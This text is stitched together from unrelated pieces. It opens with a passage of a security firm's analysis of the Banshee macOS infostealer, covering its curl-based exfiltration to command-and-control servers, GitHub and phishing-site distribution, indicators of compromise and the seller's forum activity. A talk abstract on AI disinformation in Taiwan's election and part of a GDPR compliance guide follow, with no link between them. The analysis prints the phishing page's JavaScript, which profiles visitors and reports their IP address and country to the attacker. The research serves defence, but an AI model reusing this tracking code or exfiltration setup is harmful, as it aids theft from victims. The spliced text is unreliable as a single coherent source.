&lt;p&gt;Finally, the file is sent via a POST HTTP request to the command and control server by executing the curl command &lt;code&gt;-X POST -H "Content-Type: application/json" --data&lt;/code&gt;&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30951" height="520" src="https://research.checkpoint.com/wp-content/uploads/2024/12/004-2.png" width="536" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 4 &amp;#8211; C&amp;amp;C decryption.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The initial Banshee stealer command and control servers run the Django framework with bots and threat actors interacting with the same server. On further panel developments, the author introduced a &lt;strong&gt;Staging/Relay Server&lt;/strong&gt; with the &lt;code&gt;urls.py&lt;/code&gt; file responding to two paths:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;code&gt;/api/send&lt;/code&gt; for the Bot-C&amp;amp;C communication&lt;/li&gt;



&lt;li&gt;&lt;code&gt;/admin/login&lt;/code&gt; for the Django admin.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;The stolen data were finally sent to another server where the threat actor/admin was able to retrieve the infection statistics and stolen credentials.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30952" height="513" src="https://research.checkpoint.com/wp-content/uploads/2024/12/005-1.png" width="811" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 5 &amp;#8211; Django C&amp;amp;C panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Subsequent campaigns and panel developments rebuilt the Relay Server using FastAPI instead of Django. This shift eliminated the Django-specific &lt;code&gt;/admin/login&lt;/code&gt; path, providing a single option for a POST request at &lt;code&gt;/&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30953" height="556" src="https://research.checkpoint.com/wp-content/uploads/2024/12/006-1-1024x556.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 6 &amp;#8211; FastAPI documentation.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Currently, the server hosting the admin panel is &amp;#8220;hidden&amp;#8221; behind the Relay servers, providing a more stealthy method of hosting malicious infrastructure. This setup enhances the stealth of the attack, making it harder to detect and disrupt the underlying infrastructure.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30955" height="553" src="https://research.checkpoint.com/wp-content/uploads/2024/12/007-1-1024x553.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 7 &amp;#8211; Banshee login panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h1 class="wp-block-heading"&gt;GitHub Campaigns&lt;/h1&gt;



&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered multiple repositories distributing this new Banshee Stealer version specifically targeting MacOS users. The phishing repositories often pretend to offer various cracked software, especially for Adobe software or any other image or video editing solutions.&lt;/p&gt;



&lt;p&gt;This new, undetected version of &lt;strong&gt;Banshee&lt;/strong&gt; was distributed in at least three waves by multiple repositories. The first occurred between October 18 and 21, through nine repositories, each receiving 10 to 30 stars, increasing their appearance as legitimate. A second smaller campaign occurred somewhere around October 31, while the third wave of repositories was discovered around November 3. These waves used roughly the same number of repositories and stargazers as the first waves. In all cases, the network initially created malicious repositories, mostly empty and without any malicious code. Approximately two weeks later, after the repositories matured, the malicious actions began.&lt;/p&gt;



&lt;p&gt;The &lt;strong&gt;first campaign&lt;/strong&gt; only targeted MacOS users, distributing two files: &lt;code&gt;Software_Installation_Tool.v3.2.zip&lt;/code&gt; which contained &lt;code&gt;Setup_V3.2.dmg (Setup)&lt;/code&gt;, and &lt;code&gt;Setup_V3.0.dmg&lt;/code&gt;, which contained the same file hash, a new version of &lt;strong&gt;Banshee stealer&lt;/strong&gt;. The binary’s campaign ID was &lt;code&gt;7hsaHicTxe25WLb38j6RTPZfJDmkIB&lt;/code&gt;, and the C&amp;amp;C where the threat-actor received the stolen information was &lt;code&gt;hxxp://41[.]216[.]183[.]49/api/send/&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30957" height="726" src="https://research.checkpoint.com/wp-content/uploads/2024/12/008-2-1024x726.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 8 &amp;#8211; Repositories from first campaign.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The &lt;strong&gt;second campaign,&lt;/strong&gt; which was “committed” on October 31, targeted both &lt;strong&gt;Windows&lt;/strong&gt; and &lt;strong&gt;MacOS&lt;/strong&gt; users. The repositories redirect victims to a &lt;code&gt;github.io&lt;/code&gt; post containing two malicious archive links: one for &lt;strong&gt;Windows&lt;/strong&gt; with &lt;strong&gt;Lumma Stealer&lt;/strong&gt; and one for &lt;strong&gt;MacOS&lt;/strong&gt; with &lt;strong&gt;Banshee Stealer&lt;/strong&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30958" height="485" src="https://research.checkpoint.com/wp-content/uploads/2024/12/009-1024x485.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 9 &amp;#8211; Commit updating &lt;code&gt;README&lt;/code&gt; content.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;

&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30961" height="702" src="https://research.checkpoint.com/wp-content/uploads/2024/12/010.png" width="554" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 10 &amp;#8211; Github.io site.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;These two links download the malicious archives from another repository’s release.&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;&amp;lt;a href="hxxps://github[.]com/ArvendraChhonkar/todo/releases/download/macosandwindows/Project_v1.2.0.zip" class="download-button"&gt;Download for Windows&amp;lt;/a&gt;
&amp;lt;a href="hxxps://github[.]com/ArvendraChhonkar/todo/releases/download/macosandwindows/install_setup_v1.2.0.dmg" class="download-button"&gt;Download for macOS&amp;lt;/a&gt;
&lt;/pre&gt;



&lt;p&gt;The second &lt;strong&gt;Banshee stealer&lt;/strong&gt; campaign ID was &lt;code&gt;K1WDRRD8E2dHM7i2WFSHyN4DKG3v7q&lt;/code&gt;, and the C&amp;amp;C was unchanged. Last time checked (December 10), the repositories still spread malware and remain undetected despite the fact that the &lt;code&gt;.dmg&lt;/code&gt; file is unzipped and not password protected.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30963" height="357" src="https://research.checkpoint.com/wp-content/uploads/2024/12/011-1024x357.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 11 &amp;#8211; Malicious release.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The &lt;strong&gt;third campaign&lt;/strong&gt; took place around November 3rd and targeted &lt;strong&gt;Windows&lt;/strong&gt; and &lt;strong&gt;MacOS&lt;/strong&gt; users as well. The &lt;strong&gt;Mac&lt;/strong&gt; release &lt;code&gt;Soft.Install.v1.4.zip&lt;/code&gt; contained &lt;code&gt;Installer.dmg (Installer)&lt;/code&gt; which carried the malware. The Bot communicated with the same C&amp;amp;C as the previous campaign but with ID &lt;code&gt;KAriWgOCQrqvyRSnPOnaE6UUBWjELA&lt;/code&gt;. The &lt;strong&gt;Lumma Stealer&lt;/strong&gt; release &lt;code&gt;ExtraModes_v1.6.zip (Setup.exe)&lt;/code&gt; had nine C&amp;amp;C servers with tld &lt;code&gt;.site&lt;/code&gt; , while further endpoints were hosted on Steam. The threat actor behind this campaign uses two stealers in his arsenal: Lumma to target Windows and Banshee to target MacOS.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30964" height="768" src="https://research.checkpoint.com/wp-content/uploads/2024/12/012-1024x768.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 12 &amp;#8211; Dual targeting OS campaigns.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Almost all repositories were created before they started pushing malware. The releases hosted two archives, one targeting Windows and the other MacOS.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30965" height="395" src="https://research.checkpoint.com/wp-content/uploads/2024/12/013-1024x395.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 13 &amp;#8211; Repository releases.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;h1 class="wp-block-heading"&gt;New Version Campaigns&lt;/h1&gt;



&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; successfully obtained multiple files from the new version of the &lt;strong&gt;Banshee&lt;/strong&gt; Stealer which introduced string encryption for the first time on September 26th. Since then, we observed over 26 campaigns. Three of them were distributed via GitHub, though there may be more that have yet to be identified. The remaining campaigns appear to use different distribution methods. However, based on the filenames of the obtained files, they still impersonate popular software such as Chrome, TradingView, Zegent, Parallels, Solara, CryptoNews, MediaKIT, and Telegram.&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; collected all the samples, extracted the campaigns and the command and control servers, and obtained the file names masquerading as popular software. By generating the node graph below, we can distinguish two major clusters, primarily separated based on the distribution methods. The first major cluster, with C&amp;amp;C &lt;code&gt;41[.]216.183.49&lt;/code&gt;, possibly distributed most of the Banshee stealer campaigns through malicious repositories commonly using filenames such as “Setup”, “Installer” and “Update”. The second cluster consists of multiple linked command and control servers that share the same &amp;#8220;software&amp;#8221; names, maintaining consistency across various campaigns and changes to the command and control servers.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30966" height="611" src="https://research.checkpoint.com/wp-content/uploads/2024/12/014-1024x611.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 14 &amp;#8211; Campaigns clusters.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;One recent campaign from the second cluster, observed on December 3, impersonates a fake Telegram chat through a phishing website, directing the user to download a file. The website retrieves the User-Agent from the request and, if the machine is MacOS, provides the download link and instructions to install it. When visiting the phishing website with Windows or Linux User-Agents, the malicious download link is not displayed. The malicious file is downloaded from &lt;code&gt;hxxps://api7[.]cfd/testet123t/Telegram.dmg&lt;/code&gt;.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30968" height="576" src="https://research.checkpoint.com/wp-content/uploads/2024/12/015-1024x576.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 15 &amp;#8211; Phishing site targeting MacOS (left) and Windows (Right).&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;The HTML files &lt;code&gt;index.html&lt;/code&gt; as well as &lt;code&gt;mobile.html&lt;/code&gt; contain no other malicious functionality except to report back via &lt;code&gt;sendNotification.php&lt;/code&gt; to the threat actor that a user visited the phishing page. While &lt;code&gt;mac.html&lt;/code&gt; provides the victim with the malicious link to download Banshee. JavaScript code handling the User-Agent is shown below:&lt;/p&gt;



&lt;pre class="EnlighterJSRAW"&gt;  &amp;lt;script&gt;
    document.addEventListener('DOMContentLoaded', function () {
      async function sendVisitorDetails(isVerifyClick = false) {
        try {
          const response = await fetch('&amp;lt;https://ipapi.co/json/&gt;');
          const data = await response.json();

          const userAgent = navigator.userAgent;
          let os = 'Unknown';
          let redirectUrl = null;

          if (/Macintosh/i.test(userAgent) &amp;amp;&amp;amp; !/iPhone|iPad|iPod/i.test(userAgent)) {
            os = '&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; macOS';
          } else if (/iPhone|iPad|iPod|Android/i.test(userAgent)) {
            os = '&lt;img alt="⚠" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/26a0.png" style="height: 1em;" /&gt; Mobile';
            redirectUrl = 'mobile.html';  
          } else if (/Windows/i.test(userAgent)) {
            os = '&lt;img alt="✅" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2705.png" style="height: 1em;" /&gt; Windows';
          }

          const message = isVerifyClick
            ? ` MacOS user is being shown stealer installation instructions:\\n- OS: ${os}\\n-  Country: ${data.country_name || 'Unknown'}\\n-  IP: ${data.ip || 'Unknown'}`
            : ` MacOS user redirected to stealer page:\\n- OS: ${os}\\n-  Country: ${data.country_name || 'Unknown'}\\n-  IP: ${data.ip || 'Unknown'}`;

          await fetch('sendNotification.php', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify({ message: message })
          });

          if (redirectUrl &amp;amp;&amp;amp; !isVerifyClick) {
            window.location.href = redirectUrl;
          }

        } catch (error) {
          console.error('Failed to send visitor details:', error);
        }
      }

      sendVisitorDetails();

      document.querySelectorAll('.verify-trigger').forEach(button =&gt; {
        button.addEventListener('click', () =&gt; {
          sendVisitorDetails(true);  
        });
      });
    });
  &amp;lt;/script&gt;
&lt;/pre&gt;



&lt;p&gt;In this case, the threat actor is not performing dual infections on MacOS and Windows users and is clearly only interested in victims using the first one. How a victim arrives at the phishing website is currently unclear; however, users seeking to download cracked or tools from illegitimate sources are the target of such attacks. Similar phishing websites have been found distributing constantly updated &lt;code&gt;.dmg&lt;/code&gt; files, as shown by the URLs and corresponding filenames below:&lt;/p&gt;

&lt;p&gt;Even though the Banshee stealer-as-a-service business has closed, threat actors are still using the updated versions of the service and performing new campaigns targeting MacOS users. It is unclear whether the remaining campaigns originate from previous customers or if the creator of Banshee is continuously updating the source code and using the malware as part of the private group hired in XSS to conduct MacOS campaigns.&lt;/p&gt;



&lt;h1 class="wp-block-heading"&gt;Author and Darkweb Forums&lt;/h1&gt;



&lt;p&gt;On July 18, &lt;code&gt;@kolosain&lt;/code&gt; created a Telegram channel and began selling the Banshee stealer for $2,999. Then, between August 13 and 15, the account &lt;code&gt;@0xe1&lt;/code&gt;, the same actor behind the Telegram channel (&lt;code&gt;@kolosain&lt;/code&gt;), published on XSS and Exploit forums offering the Banshee MacOS stealer as a service to a broader audience for a discounted price of $1,500 per month.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30971" height="787" src="https://research.checkpoint.com/wp-content/uploads/2024/12/016-1024x787.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 16 &amp;#8211; XSS post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Between August 26 and 28, &lt;code&gt;@0xe1&lt;/code&gt; started recruiting members for a small private group that would operate and perform campaigns. The seller offered the Banshee stealer and support to bypass Antivirus engines, starting with a 50% profit share for affiliates, which later increased to 60-65%. The recruitment was limited to only two spots, and &lt;code&gt;@0xe1&lt;/code&gt; was searching for skilled actors with experience.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30972" height="659" src="https://research.checkpoint.com/wp-content/uploads/2024/12/017-1024x659.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17 &amp;#8211; Private group recruitment.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;Check Point Research&lt;/strong&gt; discovered the first version of Banshee Stealer using this new string encryption algorithm on September 26. Since then, campaigns using the old version have not been observed. On October 17, the author posted on XSS trying to sell the entire project for 1BTC. Soon after, the price dropped to $30.000. The timing suggests that the author may have been aware that the original source code had been leaked and was trying to quickly sell the project to make some quick cash.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-large"&gt;&lt;img alt="" class="wp-image-30973" height="693" src="https://research.checkpoint.com/wp-content/uploads/2024/12/018-1024x693.png" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18 &amp;#8211; Banshee sale post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Throughout this entire time, from October 10 to November 14, the stealer received updates which can be seen by posts on the Banshee forums.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30974" height="393" src="https://research.checkpoint.com/wp-content/uploads/2024/12/019.jpg" width="1014" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19 &amp;#8211; Updates post.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;By November 24, the author decided to close the service since the original source code of the Banshee Stealer was &lt;a href="https://github.com/Evi1Grey5/MacOS-S"&gt;leaked&lt;/a&gt; the previous day. Since then, we discovered multiple campaigns mostly distributed through phishing websites. It is unclear if those campaigns are performed by the remaining customers or the author’s private group.&lt;/p&gt;


&lt;div class="wp-block-image"&gt;
&lt;figure class="aligncenter size-full"&gt;&lt;img alt="" class="wp-image-30975" height="784" src="https://research.checkpoint.com/wp-content/uploads/2024/12/020.png" width="953" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20 &amp;#8211; Closing business.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;


&lt;p&gt;Shortly after the code leak, antivirus engines started detecting even the newest versions of Banshee, which included string encryption and new anti-analysis techniques. While this leak may help improve detection, it also poses the risk of creating multiple forks and new versions of Banshee being developed and distributed by different actors.&lt;/p&gt;



&lt;h1 class="wp-block-heading"&gt;Conclusion&lt;/h1&gt;



&lt;p&gt;This relatively small code update of string encryption introduced by the developer of Banshee caused most antivirus engines to fail to detect this dangerous macOS infostealer for over two months. This illustrates the growing trend of threat actors targeting macOS users as well as the expansion of their arsenal and capabilities with malware and tools for different operating systems.&lt;/p&gt;



&lt;p&gt;Malicious repositories on GitHub which primarily target Windows users, have gradually extended their reach to macOS, Linux, and Android platforms. The surge in infections among Windows users led threat actors to replicate their attack chain for macOS, broadening the scope of the threat across multiple operating systems. While Windows-based malware was often distributed via password-protected archives on GitHub to evade detection, macOS disk image files (DMG) and unprotected archives were openly shared on the platform.&lt;/p&gt;



&lt;p&gt;Despite macOS traditionally being regarded as more secure, Banshee&amp;#8217;s success demonstrates the importance for macOS users to remain vigilant. It is crucial for security solutions to evolve and provide better protection against increasingly sophisticated attacks as threat actors continue to expand their reach.&lt;/p&gt;



&lt;h1 class="wp-block-heading"&gt;Mitigations&lt;/h1&gt;



&lt;p&gt;Operating systems and applications must be updated with timely patches and other means to mitigate the risks of threats like Banshee Stealer. Individuals should exercise caution when dealing with unexpected emails or messages containing links, particularly from unknown senders. Enhancing cybersecurity awareness among employees is also crucial, as it fosters a vigilant workforce. Lastly, consulting security specialists for any uncertainties can provide valuable expertise and guidance in navigating potential security challenges.&lt;/p&gt;

But looking at Taiwan’s 2024 election, none of these nightmare scenarios materialized. The deafening silence of effective AI disinformation from China, America’s most advanced opponent, was surprising. Even more so given the focus on the election at the highest levels of the Chinese government.&lt;/p&gt;
&lt;p&gt;In this highly-engaging talk, Martin Wendiggensen details how he set out to study the election and collected tens of thousands of hours of footage from YouTube and television as well as hundreds of thousands of news articles, blog posts, and social media content. This collection was then analyzed with a multi-modal AI pipeline. The results indicated that the small amount of AI-content received no engagement and had no impact.&lt;/p&gt;
&lt;p&gt;Instead, Taiwanese billionaires earning most of their money in China mounted a concerted effort to buy or set up local news outlets in Taiwan in the run-up to the election. Conducting a large-scale analysis of these outlets’ output uncovered interesting results. Their viewership, numbering in the millions, presented slanted narratives aligned with the Beijing-friendly KMT and a new emergent third party. While losing the presidential election, these two parties managed to wrest control of Taiwan’s parliament and are set to have a major impact on the country’s foreign and domestic policies.&lt;/p&gt;
&lt;p&gt;This presentation guides the audience through Chinese and local disinformation efforts in the Taiwanese election, highlighting the main lessons that can be drawn from them to safeguard future elections. Along the way, Martin explains the research methodology and toolbox that leverages open-source AI to fight disinformation.&lt;/p&gt;

&lt;/ol&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Secure-management-buy-in"&gt;1. Secure management buy-in&lt;/h2&gt;



&lt;p&gt;Board or senior management support is a prerequisite to successfully introducing cultural change to the organisation.&lt;/p&gt;



&lt;p&gt;This doesn’t just ensure the project will be sufficiently resourced, but also ensures improved cooperation. Don’t forget: while someone will be in charge of the overall project – the data protection lead – that person isn’t responsible for ‘doing’ compliance themselves. Rather, they guide others through the necessary activities, and are responsible for maintaining compliance.&lt;/p&gt;



&lt;p&gt;But to get such cooperation, and see as little resistance to change as possible, managers must support these changes.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-what-personal-data-you-hold"&gt;2. Identify what personal data you hold&lt;/h2&gt;



&lt;p&gt;Contrary to common belief, the GDPR &lt;em&gt;isn’t&lt;/em&gt; prescriptive.&lt;/p&gt;



&lt;p&gt;The Regulation doesn’t list specific actions every organisation within scope must take. Rather, it takes a principles- and risk-based approach. Organisations that process less personal data, or less &lt;a href="https://www.itgovernance.co.uk/blog/the-gdpr-do-you-know-the-difference-between-personal-data-and-sensitive-data" rel="noreferrer noopener" target="_blank"&gt;sensitive data&lt;/a&gt;, require less rigorous measures than entities that process lots of highly sensitive data.&lt;/p&gt;



&lt;p&gt;But to determine what’s appropriate for your organisation, you must first identify exactly what personal data you’re collecting and holding.&lt;/p&gt;



&lt;p&gt;To make life easier, take it one department at a time, preferably starting with HR and other highly regulated teams. Data protection leads may also want to look at higher-risk departments before lower-risk teams, as well as take into account which teams are more receptive to becoming compliant.&lt;/p&gt;



&lt;p&gt;You may well find that as you get a few teams on board, and they start to experience the day-to-day benefits of compliance, the remaining teams become more cooperative too.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-your-processing-activities"&gt;3. Identify your processing activities&lt;/h2&gt;



&lt;p&gt;Once you’ve identified what personal data you collect and process, you can identify the processing activities for which you’re using that data.&lt;/p&gt;



&lt;p&gt;You could think of this as creating your ‘data inventory’, which you can later use as the basis for your Article 30 &lt;a href="https://www.itgovernance.co.uk/blog/records-of-processing-activities-ropas-simplifying-gdpr-compliance" rel="noreferrer noopener" target="_blank"&gt;ROPAs (records of processing activities)&lt;/a&gt;. Make sure you specifically identify what data is used for what processing activities. This will highlight data you might be collecting but not using, or that doesn’t need to be used to fulfil the purpose of a given activity (raising &lt;a href="https://www.itgovernance.co.uk/blog/how-organisations-are-failing-to-process-personal-data-lawfully-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;issues around lawfulness&lt;/a&gt;).&lt;/p&gt;



&lt;p&gt;This isn’t just to meet key GDPR principles like data minimisation and purpose limitation, but also minimises the risk to your organisation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Identify-your-purposes-for-processing"&gt;4. Identify your purposes for processing&lt;/h2&gt;



&lt;p&gt;The GDPR demands that personal data be processed &lt;em&gt;lawfully&lt;/em&gt;.&lt;/p&gt;



&lt;p&gt;That means you must be able to rely on one of six &lt;a href="https://www.itgovernance.co.uk/blog/gdpr-lawful-bases-for-processing-with-examples" rel="noreferrer noopener" target="_blank"&gt;lawful bases&lt;/a&gt; to process the data:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;Contractual obligation&lt;/li&gt;



&lt;li&gt;Legal obligation&lt;/li&gt;



&lt;li&gt;Vital interests&lt;/li&gt;



&lt;li&gt;Public interest&lt;/li&gt;



&lt;li&gt;Legitimate interests&lt;/li&gt;



&lt;li&gt;Consent&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;If you can’t point to one of these purposes for a processing activity, that doesn’t simply make the processing unlawful – it strongly suggests the data isn’t serving a &lt;em&gt;business &lt;/em&gt;purpose, either.&lt;/p&gt;



&lt;p&gt;If you can’t explain why you’re collecting the data – and “just in case” isn’t a good reason – you should probably destroy that data.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="Eliminate-inefficiencies"&gt;5. Eliminate inefficiencies&lt;/h2&gt;



&lt;p&gt;Besides uncovering data you don’t need, you may identify other inefficiencies, too:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Duplicated work/processes&lt;/li&gt;



&lt;li&gt;A process that could be done in another way (simpler, cheaper, faster, etc.)&lt;/li&gt;



&lt;li&gt;Data that’s not properly secured&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Addressing such matters makes it easier to manage your risks, and improves data governance and accountability. People will take ownership and responsibility for their roles, and communicate better.&lt;/p&gt;



&lt;p&gt;As an organisation, you’ll also be more confident and create a better culture.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Conduct-a-risk-assessment"&gt;6. Conduct a risk assessment&lt;/h2&gt;



&lt;p&gt;Now that your business processes are more settled, it’s time to look at your risks.&lt;/p&gt;



&lt;p&gt;In spite of the general rewards that come from achieving GDPR compliance, most organisations pursue it – in the first instance – to mitigate their risks. Specifically, those of data breaches and enforcement action.&lt;/p&gt;



&lt;p&gt;We’ve previously interviewed our head of GRC consultancy, Damian Garcia, about &lt;a href="https://www.itgovernance.co.uk/blog/how-to-manage-your-cyber-risks" rel="noreferrer noopener" target="_blank"&gt;where to start with risk management&lt;/a&gt;, &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk" rel="noreferrer noopener" target="_blank"&gt;how to mitigate risks&lt;/a&gt;, and &lt;a href="https://www.itgovernance.co.uk/blog/how-to-select-effective-security-controls" rel="noreferrer noopener" target="_blank"&gt;how to select effective security controls&lt;/a&gt;.&lt;/p&gt;



&lt;p&gt;Some of his top tips include:&lt;/p&gt;



&lt;ul class="wp-block-list li-spaced"&gt;
&lt;li&gt;Make sure you clearly define what constitutes a ‘high’, ‘medium’ or ‘low’ risk. Establish a common vocabulary to make sure everyone is using the same words to mean the same thing.&lt;/li&gt;



&lt;li&gt;Remember that you don’t have to &lt;em&gt;eliminate&lt;/em&gt; a risk – just bring the risk level down to an acceptable level.&lt;/li&gt;



&lt;li&gt;To achieve this, you can choose from four broad risk responses: modify, share, retain and avoid.&lt;/li&gt;



&lt;li&gt;Of these, ‘modify’ – i.e. implementing a control – is the most common response. When choosing your measures, be sure to ask ‘why’. What &lt;em&gt;benefit&lt;/em&gt; does that control have, and does it outweigh its cost?&lt;/li&gt;



&lt;li&gt;Should you choose to ‘share’ a risk, remember that outsourcing a risk doesn’t equate to getting rid of that risk. Damian gave more specific tips on mitigating the risks around outsourcing &lt;a href="https://www.itgovernance.co.uk/blog/how-do-you-mitigate-information-security-risk#Share-the-risk" rel="noreferrer noopener" target="_blank"&gt;here&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;







&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Conduct-a-DPIA-(data-protection-impact-assessment)"&gt;7. Conduct a DPIA&lt;/h2&gt;



&lt;p&gt;Where processing “is likely to result in a high risk to the rights and freedoms of natural persons”, organisations must carry out a DPIA (data protection impact assessment) under Article 35 of the GDPR.&lt;/p&gt;



&lt;p&gt;To identify processing activities that may present that “high risk”, look to your data inventory and/or data flow maps. They’ll likely involve special categories of data (such as medical information), &lt;a href="https://www.itgovernance.co.uk/blog/transferring-personal-data-under-the-gdpr" rel="noreferrer noopener" target="_blank"&gt;international transfers&lt;/a&gt;, new software, new processing activities, and so on. Our &lt;a href="https://www.itgovernance.co.uk/a-concise-guide-to-data-protection-impact-assessments" rel="noreferrer noopener" target="_blank"&gt;free green paper&lt;/a&gt; elaborates on which processing activities are likely to require a DPIA, and how to conduct one.&lt;/p&gt;



&lt;p&gt;Remember that the risk must be “high” from the &lt;em&gt;data subject’s&lt;/em&gt; perspective – not that of the organisation, as with typical risk assessments.&lt;/p&gt;



&lt;p&gt;That said, by mitigating the risks to the data subject, you’ll likely also be reducing the risks to your organisation.&lt;/p&gt;



&lt;center&gt;&lt;hr class="wp-block-separator" /&gt;&lt;/center&gt;



&lt;h2 class="wp-block-heading" id="Implement-appropriate-technical-and-organisational-measures"&gt;8. Implement appropriate technical and organisational measures&lt;/h2&gt;



&lt;p&gt;Another key GDPR principle is ‘integrity and confidentiality.’&lt;/p&gt;



&lt;p&gt;This requires personal data to be processed in a way that ensures “appropriate security” by using “appropriate technical or organisational measures”. In addition, Article 32 of the GDPR requires appropriate technical and organisational measures to ensure “a level of security appropriate to the risk”.&lt;/p&gt;



&lt;p&gt;Such measures can include:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Encryption&lt;/li&gt;



&lt;li&gt;Pseudonymisation&lt;/li&gt;



&lt;li&gt;Strong &lt;a href="https://www.itgovernance.co.uk/blog/what-is-access-control" rel="noreferrer noopener" target="_blank"&gt;access control&lt;/a&gt;&lt;/li&gt;



